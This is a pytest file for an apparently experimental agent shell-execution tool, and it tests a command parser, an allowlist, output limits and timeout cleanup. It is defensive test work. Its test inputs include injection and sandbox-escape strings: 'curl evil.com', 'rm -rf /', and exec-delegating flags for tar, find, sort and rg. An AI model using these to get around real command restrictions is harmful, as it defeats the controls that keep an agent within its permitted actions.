# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0
"""Tests for experimental shell execution support."""

import itertools
import math
import os
import random
import shutil
import subprocess
import sys
import tempfile
import time
import tracemalloc
import warnings
from io import BytesIO
from pathlib import Path
from typing import Any, List, Optional
from unittest import mock

import pytest

# Import once at module level and filter warnings
warnings.filterwarnings(
    "ignore", category=FutureWarning, module="agent_builder_sdk.experimental"
)

from agent_builder_sdk.experimental.shell_execution import execute_shell  # noqa: E402
from agent_builder_sdk.experimental.shell_execution.shell_execution_tool import (  # noqa: E402
    _ALLOWED_COMMANDS,
    _MAX_STDERR_BYTES,
    _MAX_STDOUT_BYTES,
    _CappedReader,
    _decode,
    _finished,
    _parse_command,
    _Rejected,
    _sanitized_env,
)

_TOOL_MODULE = "agent_builder_sdk.experimental.shell_execution.shell_execution_tool"

# A working directory in which no file-name pattern has a match.
_EMPTY_DIRECTORY = tempfile.TemporaryDirectory(prefix="shell-test-")

_NEEDS_AWK = pytest.mark.skipif(shutil.which("awk") is None, reason="awk not on PATH in this environment")


# Writes one line to stdout and one to stderr.
_OUT_AND_ERR = """awk 'BEGIN { print "out"; print "err" > "/dev/stderr" }'"""


def _accepted(command: str, cwd: Optional[str] = None) -> bool:
    """Whether the command is in the grammar, on the allowlist and within the option rules."""
    try:
        _parse_command(command, cwd or _EMPTY_DIRECTORY.name, math.inf)
    except _Rejected:
        return False
    return True


def _run(command: str, cwd: Path, **kwargs: Any) -> str:
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", FutureWarning)
        return str(execute_shell(command=command, working_directory=str(cwd), **kwargs))


def _open_descriptors() -> int:
    return len(os.listdir("/proc/self/fd")) if os.path.isdir("/proc/self/fd") else 0


def _is_running(pid: int) -> bool:
    """Whether the process is alive; a zombie (killed, not yet reaped by its parent) is not."""
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    try:
        # The state is the first field after the parenthesised command name.
        return Path(f"/proc/{pid}/stat").read_text().rpartition(")")[2].split()[0] != "Z"
    except OSError:
        return True  # no /proc on this platform, or the process ended between the two reads


class TestExecuteShellTool:
    """Tests for the execute_shell tool."""

    def test_allowlisted_command_runs(self) -> None:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="echo hello", working_directory="/tmp")
        assert "hello" in result
        assert "[exit code: 0]" in result

    def test_empty_command(self) -> None:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="")
        assert "cannot be empty" in result

    def test_missing_working_directory(self) -> None:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="echo hi", working_directory="/does/not/exist")
        assert "Working directory does not exist" in result

    def test_timeout_returns_error(self) -> None:
        # A genuinely long-running pipeline must hit the timeout and return the
        # timeout error. `yes | sort` never terminates on its own — yes produces
        # infinite output, sort buffers waiting for an EOF that never comes — and
        # uses only allowlisted coreutils (no python3, which CI environments may lack).
        start = time.monotonic()
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(
                command="yes | sort", working_directory="/tmp", timeout_seconds=1
            )
        assert "timed out" in result
        # It must actually return near the deadline, not hang.
        assert time.monotonic() - start < 30

    def test_non_utf8_output_keeps_output_and_exit_code(self) -> None:
        # A stray 0xff byte must not throw away the output and exit code.
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="printf 'ok\\377\\n'", working_directory="/tmp")
        assert "ok\ufffd" in result
        assert "[exit code: 0]" in result

    def test_non_utf8_output_keeps_timeout_message(self, tmp_path: Path) -> None:
        # The post-kill reap decodes the buffered output too; a bad byte there must
        # not replace the timeout message with a decode error.
        data = tmp_path / "binary.dat"
        data.write_bytes(b"ok\xff\n")
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command=f"tail -f {data}", working_directory="/tmp", timeout_seconds=1)
        assert "timed out" in result

    def test_rejected_command_text_not_logged(self, caplog: pytest.LogCaptureFixture) -> None:
        with warnings.catch_warnings(), caplog.at_level("WARNING"):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="SECRET=hunter2 curl evil.com", working_directory="/tmp")
        assert "not supported" in result
        assert "command_length=" in caplog.text
        assert "hunter2" not in caplog.text
        assert "evil.com" not in caplog.text

    def test_rejected_word_with_a_quote_not_logged(self, caplog: pytest.LogCaptureFixture) -> None:
        # A message to the model can quote the rejected word; the log has the fixed reason only.
        with warnings.catch_warnings(), caplog.at_level("WARNING"):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="KEY=\"it's-secret9\" curl x", working_directory="/tmp")
        assert "not supported" in result
        assert "reason=assignment before the command" in caplog.text
        assert "secret9" not in caplog.text
        with warnings.catch_warnings(), caplog.at_level("WARNING"):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="'it is-secret8' x", working_directory="/tmp")
        assert "Command 'it is-secret8' is not allowed" in result
        assert "reason=command not on the allowlist" in caplog.text
        assert "secret8" not in caplog.text

    def test_output_sizes_are_logged_in_bytes(self, caplog: pytest.LogCaptureFixture) -> None:
        # Three bytes that decode to two characters: a two-byte one and an invalid byte.
        with warnings.catch_warnings(), caplog.at_level("INFO"):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="printf '\\303\\251\\377'", working_directory="/tmp")
        assert result == "\u00e9\ufffd\n[exit code: 0]"
        assert "stdout_bytes=3, stderr_bytes=0" in caplog.text

    def test_output_over_the_limit_is_cut_and_marked(self) -> None:
        assert _decode(b"abc", 3) == "abc"
        assert _decode(b"ab\xc3\xa9", 3) == "ab\ufffd\n[output truncated]"
        assert _decode(b"", 3) == ""

    def test_reader_keeps_the_first_bytes_and_counts_all(self) -> None:
        reader = _CappedReader(BytesIO(b"abcdef" * 100_000), 4)
        reader.join(timeout=10)
        assert bytes(reader.kept) == b"abcd"
        assert reader.total_bytes == 600_000

    @pytest.mark.parametrize(
        "command, kept, logged",
        [
            pytest.param(
                "head -c 100000000 /dev/zero",
                "\x00" * _MAX_STDOUT_BYTES,
                "stdout_bytes=100000000, stderr_bytes=0",
                id="stdout",
            ),
            pytest.param(
                # 100 times a string of 2**20 characters.
                """awk 'BEGIN { s = "0"; while (length(s) < 1000000) s = s s; """
                """for (i = 0; i < 100; i++) printf "%s", s > "/dev/stderr" }'""",
                "[stderr]\n" + "0" * _MAX_STDERR_BYTES,
                "stdout_bytes=0, stderr_bytes=104857600",
                id="stderr",
                marks=_NEEDS_AWK,
            ),
        ],
    )
    def test_output_far_over_the_limit_is_not_held_in_memory(
        self, caplog: pytest.LogCaptureFixture, command: str, kept: str, logged: str
    ) -> None:
        # 100 MB of output on stdout, then on stderr: the result is cut at the limit of
        # the stream, and the agent process must not hold the rest while the command runs.
        tracemalloc.start()
        try:
            with warnings.catch_warnings(), caplog.at_level("INFO"):
                warnings.simplefilter("ignore", FutureWarning)
                result = execute_shell(command=command, working_directory="/tmp")
            peak_bytes = tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()
        assert result == kept + "\n[output truncated]\n[exit code: 0]"
        assert logged in caplog.text
        assert peak_bytes < 10 * 1024 * 1024

    @pytest.mark.parametrize("requested, used", [(100000, 120), (0, 1)])
    def test_timeout_is_kept_between_1_and_120_seconds(self, requested: int, used: int) -> None:
        with warnings.catch_warnings(), mock.patch(f"{_TOOL_MODULE}._finished", wraps=_finished) as finished:
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="true", working_directory="/tmp", timeout_seconds=requested)
        assert result == "[exit code: 0]"
        # The command gets what is left of the timeout after the parse and pattern expansion.
        assert used - 1 < finished.call_args.args[2] < used

    def test_command_does_not_read_the_agents_stdin(self) -> None:
        # With the agent's stdin an open pipe, a command that reads stdin would wait
        # on it until the timeout.
        read_end, write_end = os.pipe()
        agent_stdin = os.dup(0)
        os.dup2(read_end, 0)
        try:
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", FutureWarning)
                result = execute_shell(command="cat", working_directory="/tmp", timeout_seconds=2)
        finally:
            os.dup2(agent_stdin, 0)
            for fd in (agent_stdin, read_end, write_end):
                os.close(fd)
        assert result == "[exit code: 0]"

    @_NEEDS_AWK
    def test_timeout_kills_the_process_tree_of_every_stage(self, tmp_path: Path) -> None:
        # A child of each stage must be killed on timeout, not orphaned. awk starts in
        # milliseconds, so the probe runs long before the timeout: the shell of its
        # system() call records its own PID and then becomes the sleep.
        # Per-test paths: two test runs on one host must not share the files.
        pidfiles = [tmp_path / "first_stage.pid", tmp_path / "second_stage.pid"]
        cmd = " | ".join(
            f"""awk 'BEGIN {{ system("echo $$ > {pidfile}; exec sleep 30") }}'""" for pidfile in pidfiles
        )
        result = _run(cmd, tmp_path, timeout_seconds=1)
        assert "timed out" in result
        for pidfile in pidfiles:
            child_pid = int(pidfile.read_text())
            deadline = time.monotonic() + 5
            while _is_running(child_pid) and time.monotonic() < deadline:
                time.sleep(0.05)
            assert not _is_running(child_pid)

    def test_a_stage_that_does_not_start_ends_the_stages_before_it(self, tmp_path: Path) -> None:
        started: List["subprocess.Popen[bytes]"] = []
        real_popen = subprocess.Popen

        def second_stage_fails(*args: Any, **kwargs: Any) -> "subprocess.Popen[bytes]":
            if started:
                raise OSError("no more processes")
            started.append(real_popen(*args, **kwargs))
            return started[0]

        descriptors = _open_descriptors()
        with mock.patch(f"{_TOOL_MODULE}.subprocess.Popen", second_stage_fails):
            result = _run("tail -f /dev/null | cat", tmp_path)
        assert result == "Error: Shell execution failed: no more processes"
        assert started[0].returncode == -9
        # The readers close their pipes when the killed stage is gone.
        deadline = time.monotonic() + 5
        while _open_descriptors() > descriptors and time.monotonic() < deadline:
            time.sleep(0.05)
        assert _open_descriptors() <= descriptors

    def test_no_descriptor_stays_open_after_a_command(self, tmp_path: Path) -> None:
        descriptors = _open_descriptors()
        assert _run("printf 'b\\na\\n' 2>&1 | sort >/dev/null | wc -l", tmp_path) == "0\n\n[exit code: 0]"
        assert _open_descriptors() <= descriptors

    @_NEEDS_AWK
    def test_exit_code_of_a_program_that_a_signal_ended(self, tmp_path: Path) -> None:
        # The shell of the getline prints its parent, awk; awk then kills itself.
        cmd = """awk 'BEGIN { "echo $PPID" | getline pid; system("kill -9 " pid) }'"""
        assert _run(cmd, tmp_path) == "[exit code: 137]"

    def test_program_that_is_not_installed(self, tmp_path: Path) -> None:
        with mock.patch.dict(os.environ, {"PATH": str(tmp_path)}):
            assert _run("ls", tmp_path) == (
                "Error: Command 'ls' is on the allowlist but is not installed in this container."
            )

    def test_relative_path_entry_is_not_searched(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # With `.` in PATH, a file named `ls` in a directory that a command can write
        # would run in place of the program.
        (tmp_path / "ls").write_text("#!/bin/sh\necho planted\n")
        (tmp_path / "ls").chmod(0o755)
        monkeypatch.chdir(tmp_path)
        with mock.patch.dict(os.environ, {"PATH": os.pathsep.join([".", "", os.environ["PATH"]])}):
            result = _run("ls", tmp_path)
        assert result == "ls\n\n[exit code: 0]"

    def test_command_that_cannot_be_encoded_is_an_error(self, tmp_path: Path) -> None:
        # A lone surrogate, which a JSON tool input can hold, has no file-name encoding.
        assert _run("echo a\ud800*", tmp_path).startswith("Error: Shell execution failed: 'utf-8' codec can't encode")
        assert _run("echo a\ud800", tmp_path).startswith("Error: Shell execution failed: 'utf-8' codec can't encode")

    def test_pattern_matches_are_sorted(self, tmp_path: Path) -> None:
        for name in "3857096142":
            (tmp_path / f"{name}.dat").write_text("")
        assert _run("echo *.dat", tmp_path) == " ".join(f"{n}.dat" for n in range(10)) + "\n\n[exit code: 0]"

    @pytest.mark.parametrize(
        "command, message",
        [
            ("ls ; id", "Error: ';' between commands is not supported. execute_shell is not a shell."),
            ("ls || id", "Error: '||' is not supported."),
            ("ls |& cat", "Error: '|&' is not supported."),
            ("ls && id", "Error: '&' (a background command, '&&', '&>') is not supported."),
            ("echo $HOME", "Error: '$' outside single quotes (a variable, $(...), ${...}, $((...)), $'...') is not"),
            ("echo `id`", "Error: a backtick outside single quotes (command substitution) is not supported."),
            ("ls > out", "Error: a redirection other than 2>&1, >/dev/null and 2>/dev/null (each a word of its"),
            ("cat < in", "Error: '<' (input from a file, a here-document) is not supported."),
            ("(ls)", "Error: a parenthesis (a subshell, a process substitution) is not supported."),
            ("echo {a,b}", "Error: an unquoted '{' (brace expansion) is not supported."),
            ("ls ~/x", "Error: a word that starts with '#' (a comment) or '~' (a home directory) is not supported."),
            ("ls\nid", "Error: a line break outside quotes is not supported."),
            ("ls \\\n-l", "Error: a backslash at the end of a line is not supported."),
            ("A=1 ls", "Error: A variable assignment in front of a program (NAME=value) is not supported."),
            ("/usr/bin/ls", "Error: Give the program by its name ('ls'), not by a path."),
            ("ls |", "Error: A program name is missing: the command, or one side of a pipe (|), is empty."),
            ("ls 'a", "Error: The command has an unterminated quote."),
            ("ls \\", "Error: The command ends with a backslash."),
            ("ls a\0b", "Error: The command contains a NUL character."),
            ('echo ["!"a]', "Error: a quoted or escaped character inside an unquoted [...] is not supported."),
            ("echo [b'*'", "Error: a quoted or escaped character inside an unquoted [...] is not supported."),
            ('echo [a"]"b]', "Error: a quoted or escaped character inside an unquoted [...] is not supported."),
            ("echo [a\\]b]", "Error: a quoted or escaped character inside an unquoted [...] is not supported."),
            ("echo [[:digit:]]*", "Error: a character class inside [...] ([[:digit:]], [[.a.]], [[=a=]]) is not"),
            ("curl x", "Error: Command 'curl' is not allowed. Allowed commands: [, awk, basename,"),
        ],
    )
    def test_rejection_names_the_unsupported_form(self, tmp_path: Path, command: str, message: str) -> None:
        assert _run(command, tmp_path).startswith(message)

    def test_pattern_with_too_many_matches_is_rejected(self, tmp_path: Path) -> None:
        for name in ("a.txt", "b.txt", "c.txt"):
            (tmp_path / name).write_text("")
        with mock.patch(f"{_TOOL_MODULE}._MAX_PATTERN_MATCHES", 3):
            assert _run("echo *.txt", tmp_path) == "a.txt b.txt c.txt\n\n[exit code: 0]"
        with mock.patch(f"{_TOOL_MODULE}._MAX_PATTERN_MATCHES", 2):
            assert _run("echo *.txt", tmp_path) == (
                "Error: A file-name pattern matches more than 2 names. Narrow the pattern."
            )

    def test_pattern_expansion_stops_at_the_deadline(self, tmp_path: Path) -> None:
        for name in ("d1", "d2", "d3"):
            (tmp_path / name).mkdir()
            (tmp_path / name / "x").write_text("")
        clock = mock.Mock()
        # The deadline (5) passes after the read of the working directory and of d1.
        clock.monotonic.side_effect = itertools.chain([0.0, 0.0], itertools.repeat(10.0))
        with mock.patch(f"{_TOOL_MODULE}.time", clock):
            with pytest.raises(_Rejected, match="A file-name pattern took too long to expand"):
                _parse_command("ls */x", str(tmp_path), 5.0)
        assert clock.monotonic.call_count == 3

    @pytest.mark.parametrize(
        "command, result",
        [
            # Pipes; the exit code is that of the last stage.
            ("echo hello | tr a-z A-Z", "HELLO\n\n[exit code: 0]"),
            ("printf '%s\\n' b a c | sort | head -2", "a\nb\n\n[exit code: 0]"),
            ("yes | head -1", "y\n\n[exit code: 0]"),
            ("false | true", "[exit code: 0]"),
            ("true | false", "[exit code: 1]"),
            ("ls|wc -l", "3\n\n[exit code: 0]"),
            # Quotes and escapes.
            ("echo 'a  b' \"c  d\" e\\ f", "a  b c  d e f\n\n[exit code: 0]"),
            (
                "echo 'x; y | z & $HOME `id` $(id) > f # ~ {a,b} *'",
                "x; y | z & $HOME `id` $(id) > f # ~ {a,b} *\n\n[exit code: 0]",
            ),
            ("echo \"x; y | z & > f # ~ {a,b} * 'q'\"", "x; y | z & > f # ~ {a,b} * 'q'\n\n[exit code: 0]"),
            (
                'echo "say \\"hi\\"" "back\\\\slash" "\\$5" "\\`" "a\\b"',
                'say "hi" back\\slash $5 ` a\\b\n\n[exit code: 0]',
            ),
            ("echo \\$HOME \\; \\| \\> \\'", "$HOME ; | > '\n\n[exit code: 0]"),
            ("printf '%s|' a '' \"\" b", "a|||b|\n[exit code: 0]"),
            ("printf '%s' 'line1\nline2'", "line1\nline2\n[exit code: 0]"),
            ("echo a#b a~b }", "a#b a~b }\n\n[exit code: 0]"),
            # File-name patterns: sorted matches, the word as written without a match.
            ("echo *.txt", "a.txt b.txt\n\n[exit code: 0]"),
            ("echo [ab].txt ?.txt sub/*", "a.txt b.txt a.txt b.txt sub/c.csv\n\n[exit code: 0]"),
            ("echo '*.txt' \\*.txt \"*.txt\" 'a'*", "*.txt *.txt *.txt a.txt\n\n[exit code: 0]"),
            ("echo *.none [x", "*.none [x\n\n[exit code: 0]"),
            ("echo '?'.t* \\[ab].t*", "?.t* [ab].t*\n\n[exit code: 0]"),
            # Quotes after the ] that closes a bracket; a ] first in a bracket is a member.
            ("echo [ab]'.txt' []a].txt [!]a].txt [x/'*'", "a.txt b.txt a.txt b.txt [x/*\n\n[exit code: 0]"),
            ("echo *", "a.txt b.txt sub\n\n[exit code: 0]"),
            ("[ -d sub ]", "[exit code: 0]"),
            # The three redirections, in the order written.
            pytest.param(_OUT_AND_ERR, "out\n\n[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " 2>/dev/null", "out\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " >/dev/null", "[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " 1> /dev/null", "[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " 2>&1 | sort", "err\nout\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " >/dev/null 2>&1", "[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " 2>&1 >/dev/null", "err\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " | wc -l", "1\n\n[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
            pytest.param(_OUT_AND_ERR + " 2>&1 | wc -l", "2\n\n[exit code: 0]", marks=_NEEDS_AWK),
            ("echo 2 >/dev/null 2", "[exit code: 0]"),
        ],
    )
    def test_accepted_form_runs(self, tmp_path: Path, command: str, result: str) -> None:
        for name in ("a.txt", "b.txt", "sub/c.csv", ".hidden"):
            (tmp_path / name).parent.mkdir(exist_ok=True)
            (tmp_path / name).write_text("")
        with mock.patch.dict(os.environ, {"LC_ALL": "C"}):
            assert _run(command, tmp_path) == result

    def test_no_accepted_command_reaches_a_shell(self, tmp_path: Path) -> None:
        # 600 pipelines put together at random from programs, arguments and shell syntax.
        # Whatever the tool starts must be a program of the allowlist, found in PATH and
        # started without a shell, with the arguments as a list.
        programs = ["ls", "cat", "echo", "find", "tar", "sort", "wc", "sh", "env", "touch", "/bin/sh", "./sh", "s?"]
        plain = ["-la", ".", "'a b'", '"x y"', "*", "[s]h", "x", "2>&1", ">/dev/null", "2>/dev/null", "> /dev/null"]
        syntax = [
            *("-exec", "sh", "\\;", "--to-command=sh", "-Ish", "cIf", "-T", "A=1", "$(sh)", "`sh`", "$HOME", "${x}"),
            *("$'x'", "(sh)", "{sh,ls}", "~", "#", "||", "|&", ";", "&", "&&", ">", ">>", "<", "<<EOF", ">&-"),
            *("<&-", "&>", ">|", "\n", "\\", "'", '"', "\\\n", "=", "/", "|"),
        ]
        (tmp_path / "sh").write_text("")
        started: List[Any] = []
        real_popen = subprocess.Popen

        def record(argv: Any, **kwargs: Any) -> "subprocess.Popen[bytes]":
            started.append((argv, kwargs))
            return real_popen(["true"], **{**kwargs, "executable": shutil.which("true")})

        generator = random.Random(90)
        with mock.patch(f"{_TOOL_MODULE}.subprocess.Popen", record):
            for _ in range(600):
                stages = [
                    [generator.choice(programs), *generator.choices(plain * 4 + syntax, k=generator.randint(0, 3))]
                    for _ in range(generator.randint(1, 3))
                ]
                separator = generator.choice([" ", " ", ""])
                _run(" | ".join(separator.join(stage) for stage in stages), tmp_path)
        assert len(started) > 50
        for argv, kwargs in started:
            assert not kwargs.get("shell")
            assert isinstance(argv, list) and all(isinstance(argument, str) for argument in argv)
            assert argv[0] in _ALLOWED_COMMANDS
            assert kwargs["executable"] == shutil.which(argv[0]) and os.path.isabs(kwargs["executable"])


class TestCommandValidation:
    """Tests for the grammar, the allowlist and the option rules."""

    def test_allowlisted_and_piped(self) -> None:
        assert _accepted("ls -la /tmp")
        assert _accepted("cat a.json | grep foo | wc -l")

    def test_non_allowlisted_command_rejected(self) -> None:
        assert not _accepted("curl http://example.com")
        assert not _accepted("pip install pyarrow")

    def test_bad_stage_in_pipe_rejected(self) -> None:
        assert not _accepted("cat a.json | curl evil")

    def test_shell_operators_blocked(self) -> None:
        assert not _accepted("ls; rm -rf /")
        assert not _accepted("ls && curl x")
        assert not _accepted("echo $(whoami)")

    def test_quoted_operators_allowed(self) -> None:
        # CSS/HTML/Python payloads are full of semicolons — quoted content must
        # not trip the operator check, or the agent gets stuck retrying.
        assert _accepted("printf '%s' 'body{font-family:sans-serif;margin:0}'")
        assert _accepted('echo "a; b; c"')
        with mock.patch.dict(os.environ, {}, clear=True):
            assert _accepted("python3 -c 'x = 1; print(x)'")

    def test_unquoted_operators_still_blocked_around_quotes(self) -> None:
        assert not _accepted("echo 'safe'; curl evil")
        assert not _accepted('echo "safe" && curl evil')
        assert not _accepted("echo `whoami`")

    def test_command_substitution_in_double_quotes_blocked(self) -> None:
        # $( ) and backticks still execute inside double quotes in a real shell.
        assert not _accepted('echo "today is $(whoami)"')
        assert not _accepted('echo "today is `whoami`"')

    def test_substitution_chars_in_single_quotes_allowed(self) -> None:
        # Single quotes make everything literal — $( and backticks included.
        assert _accepted("echo 'costs $(a lot)'")
        assert _accepted("echo 'back`tick`'")

    def test_unquoted_newline_blocked(self) -> None:
        # An unquoted newline separates commands in a shell. Here it is rejected, also
        # when the second command is allowlisted (rm): the tool runs one pipeline.
        assert not _accepted("echo safe\nrm -rf /tmp/x")
        assert not _accepted("ls\ncurl evil.com")
        assert not _accepted("ls\npwd")
        assert not _accepted("echo a\rb")

    def test_quoted_newline_allowed(self) -> None:
        # A newline inside quotes is literal content, not a separator.
        assert _accepted("printf 'line1\nline2'")

    def test_env_wrapper_rejected(self) -> None:
        # `env` runs an arbitrary binary AND can re-set AWS_PROFILE, defeating
        # both the allowlist and the _sanitized_env stripping. It and the other
        # command wrappers must stay off the allowlist.
        assert not _accepted("env FOO=bar /bin/echo pwned")
        assert not _accepted("env AWS_PROFILE=persona env")
        for wrapper in ("xargs", "nice", "nohup", "timeout", "time"):
            assert not _accepted(f"{wrapper} rm x")

    def test_exec_delegating_flags_rejected(self) -> None:
        # find -exec / tar --to-command hand execution to an arbitrary child.
        assert not _accepted("find /tmp -exec rm {} ;")
        assert not _accepted("find /tmp -execdir curl x ;")
        assert not _accepted("tar --to-command=curl -cf - /tmp")
        assert not _accepted("tar --checkpoint-action=exec=sh -cf a.tar /tmp")
        # find/tar without an exec flag stay usable for inspection.
        assert _accepted("find /tmp -name '*.parquet'")
        assert _accepted("tar -tzf archive.tar.gz")

    def test_background_operator_rejected(self) -> None:
        # In a shell a lone `&` backgrounds the first command and runs whatever follows.
        assert not _accepted("echo hi & curl evil.com")
        assert not _accepted("python3 x.py & curl evil")
        assert not _accepted("head -5&curl evil.com")
        assert not _accepted("sleep 5 &")
        # `&` is read in one place only: the redirection 2>&1.
        assert _accepted("ls 2>&1")
        assert _accepted("ls >/dev/null 2>&1")
        assert not _accepted("ls 1>&2")
        assert not _accepted("ls 2>&11")
        assert not _accepted("cat f >& /tmp/x")
        assert not _accepted("cat <&0")
        # A literal & inside quotes is content, not an operator.
        assert _accepted("echo 'a & b'")
        assert _accepted('echo "a & b"')

    def test_ampersand_before_a_redirection_rejected(self) -> None:
        # bash reads `&>file` as a redirection. A shell without that operator (dash, the
        # /bin/sh of Debian images) reads `ls &` and then runs the rest as a command.
        assert not _accepted("ls &>/dev/null touch /tmp/marker")
        assert not _accepted("ls &> /tmp/x")
        assert not _accepted("ls &>> /tmp/x")
        assert not _accepted("ls |& cat")
        assert not _accepted("ls >&2 & curl evil.com")

    def test_tar_short_compress_flag_rejected(self) -> None:
        # tar's -I (--use-compress-program) runs an arbitrary program. GNU getopt
        # attaches the arg directly (-Icurl) or bundles the letter after other
        # no-arg flags (-cIcurl), neither of which a whole-word check catches.
        assert not _accepted("tar -Icurl -cf - /tmp")
        assert not _accepted("tar -cIcurl -f - /tmp")
        assert not _accepted("tar -I curl -cf - /tmp")
        assert not _accepted("tar -cIgzip -f a.tar /tmp")
        # Legit tar must still pass — including an archive name that starts with
        # 'I' attached to -f (-cfInput.tar), which must not read as the -I option.
        assert _accepted("tar -tzf archive.tar.gz")
        assert _accepted("tar -czf a.tar /tmp")
        assert _accepted("tar -cf Input.tar /tmp")
        assert _accepted("tar -cfInput.tar /tmp")
        # find -executable must not be mistaken for the -exec primary.
        assert _accepted("find /tmp -executable")

    def test_sort_rg_exec_flags_rejected(self) -> None:
        # sort --compress-program=PROG runs PROG on temp files; ripgrep --pre=CMD /
        # --hostname-bin=CMD each exec CMD — same escape as find -exec, so an
        # allowlisted sort/rg becomes a launcher for a non-allowlisted binary.
        assert not _accepted("sort --compress-program=curl f")
        assert not _accepted("sort --compress-program curl f")
        assert not _accepted("rg --pre=curl pat f")
        assert not _accepted("rg --pre curl pat f")
        assert not _accepted("rg --hostname-bin=curl pat f")
        # sort/rg without those flags stay usable.
        assert _accepted("sort -u file.txt")
        assert _accepted("rg 'pattern' /tmp")

    def test_process_substitution_rejected(self) -> None:
        # In a shell <(cmd) and >(cmd) run their inner command.
        assert not _accepted("cat <(curl evil.com)")
        assert not _accepted("tee >(curl evil.com)")
        assert not _accepted("cat <(ls)")
        # A literal <( inside quotes is content, not an operator.
        assert _accepted("echo '<(not real)'")

    def test_redirection_to_or_from_a_file_rejected(self) -> None:
        assert not _accepted("echo hi > /tmp/x")
        assert not _accepted("cat a >> b")
        assert not _accepted("sort < /tmp/f")
        assert not _accepted("ls 2>/tmp/errors")
        assert not _accepted("ls >/dev/nullx")
        assert not _accepted("ls >/dev/null/x")
        assert not _accepted("ls 3>/dev/null")
        assert not _accepted("cat <<EOF")
        # The three redirections that are read, as words of their own.
        assert _accepted("ls >/dev/null")
        assert _accepted("ls 1>/dev/null 2> /dev/null")
        assert _accepted("ls 2>/dev/null| wc -l")
        assert not _accepted("ls>/dev/null")
        assert not _accepted("ls -la2>/dev/null")
        assert not _accepted("ls '2'>/dev/null")

    def test_end_to_end_env_bypass_fails(self) -> None:
        # The validator's job proven end-to-end: env must not run a non-allowlisted
        # binary through execute_shell.
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(
                command="env FOO=bar /bin/echo INJECTED", working_directory="/tmp"
            )
        assert "INJECTED" not in result
        assert "not allowed" in result

    def test_end_to_end_newline_bypass_fails(self) -> None:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command="echo safe\nrm -rf /tmp/nope", working_directory="/tmp")
        assert result.startswith("Error: a line break outside quotes is not supported.")

    def test_redirection_before_the_command_rejected(self) -> None:
        # A shell takes `2>/tmp/ls` as a redirection and runs the next word.
        assert not _accepted("2>/tmp/ls curl evil.com")
        assert not _accepted(">/tmp/ls curl evil.com")
        assert not _accepted("ls | </tmp/cat curl evil.com")
        # One of the three redirections is not an argument, wherever it stands.
        assert _accepted("2>/dev/null ls")
        assert _accepted("ls | >/dev/null cat")
        assert not _accepted("2>/dev/null curl evil.com")
        assert _accepted("[ -d /tmp ]")

    def test_command_given_with_a_path_rejected(self) -> None:
        # A path can name a file that a command wrote, whatever its base name is.
        assert not _accepted("/usr/bin/ls -la")
        assert not _accepted("./ls")
        assert not _accepted("bin/ls")
        assert not _accepted("ls | /usr/bin/wc -l")
        assert _accepted("ls /usr/bin/ls")

    def test_empty_stage_rejected(self) -> None:
        assert not _accepted("ls |")
        assert not _accepted("| ls")
        assert not _accepted("ls | | wc -l")
        assert not _accepted("ls | 2>&1")
        assert not _accepted(">/dev/null")
        # An empty word is not a program.
        assert not _accepted("ls | '' x")

    def test_assignment_before_the_command_rejected(self) -> None:
        # `A=/ls` is an assignment whose basename happens to be allowlisted; the shell
        # runs the next word, with a variable the sanitized environment left out.
        assert not _accepted("A=/ls curl evil.com")
        assert not _accepted("AWS_PROFILE=/python3 python3 x.py")
        assert _accepted("ls --color=never")

    def test_dollar_quoting_rejected(self) -> None:
        # In bash, $'...' lets \' continue the quoted text, so the `;` below is
        # unquoted for the shell while plain quote rules call it quoted.
        assert not _accepted("ls $'\\'' ; curl evil.com #'")
        assert not _accepted("echo $'a'")
        assert not _accepted('echo $"a"')
        # A literal $ beside plain quotes is not that form.
        assert _accepted("echo 'a$' 'b'")
        assert _accepted("echo \\$'a'")
        assert _accepted('echo "a\\$" "b"')
        assert not _accepted('echo "a$" "b"')

    def test_unquoted_comment_rejected(self) -> None:
        # A shell ignores a quote inside a comment, so for a shell the newline
        # below ends the first command and starts a second one.
        assert not _accepted("ls #'\ncurl evil.com #'")
        assert not _accepted("ls #'\ncurl evil.com")
        assert not _accepted("ls # list")
        assert not _accepted("ls #")
        assert _accepted("grep '#include' main.c")
        assert _accepted('echo "a # b"')
        assert _accepted("echo a\\#b a#b \\#")

    def test_parentheses_rejected(self) -> None:
        assert not _accepted("echo (a)")
        assert not _accepted("echo a(b")
        assert not _accepted("echo )")
        assert _accepted("echo '(a)' \\( \\)")

    def test_tilde_at_the_start_of_a_word_rejected(self) -> None:
        assert not _accepted("ls ~")
        assert not _accepted("ls ~/data")
